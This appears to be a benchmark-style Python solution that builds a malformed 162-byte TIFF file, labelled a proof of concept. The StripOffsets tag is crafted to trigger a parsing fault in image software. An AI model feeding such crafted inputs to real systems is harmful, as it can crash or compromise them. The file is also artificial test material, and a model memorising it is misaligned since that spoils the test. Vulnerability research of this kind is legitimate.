class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'II\x2a\x00\x00\x00\x08\x00\x00\x00'
        num_tags = b'\x05\x00'
        tag1 = b'\x00\x01\x03\x00\x00\x00\x00\x01\x0a\x00\x00\x00'  # ImageWidth=10
        tag2 = b'\x01\x01\x03\x00\x00\x00\x00\x01\x0a\x00\x00\x00'  # ImageLength=10
        tag3 = b'\x02\x01\x03\x00\x00\x00\x00\x01\x08\x00\x00\x00'  # BitsPerSample=8
        tag4 = b'\x03\x01\x03\x00\x00\x00\x00\x01\x01\x00\x00\x00'  # Compression=1
        tag5 = b'\x11\x01\x01\x00\x14\x00\x00\x00\x00\x00\x00\x00'  # StripOffsets: type=BYTE, count=20, offset=0
        next_ifd = b'\x00\x00\x00\x00'
        poc = header + num_tags + tag1 + tag2 + tag3 + tag4 + tag5 + next_ifd
        pad = b'\x00' * (162 - len(poc))
        return poc + pad